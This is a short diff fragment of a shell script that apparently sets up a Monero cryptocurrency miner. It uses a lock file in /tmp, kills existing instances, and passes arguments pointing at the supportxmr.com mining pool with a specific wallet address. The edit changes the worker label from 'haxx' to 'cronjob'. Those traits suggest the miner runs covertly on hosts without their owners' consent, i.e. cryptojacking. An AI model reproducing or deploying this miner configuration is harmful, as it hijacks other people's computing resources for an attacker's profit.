@@ -13,7 +13,7 @@ FILENAME="session_ajqysbey"
 # Lock file
 LOCKFILE="/tmp/${FILENAME}.lock"
 # Arguments to be used when running the script
-ARGS="-o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p haxx"
+ARGS="-o pool.supportxmr.com:443 -u 48PMjoMcbA64NPR7ESQvRsKeDuVXA6AkVAr6LvEUCzxqBimsKvmxeYxN5Ys8htQ2NudViF8PVe8BHbT1eY5jWFXWQ1PB6fG -k --tls -p cronjob"
 
 # Function to kill existing instances
 kill_existing_instances() {
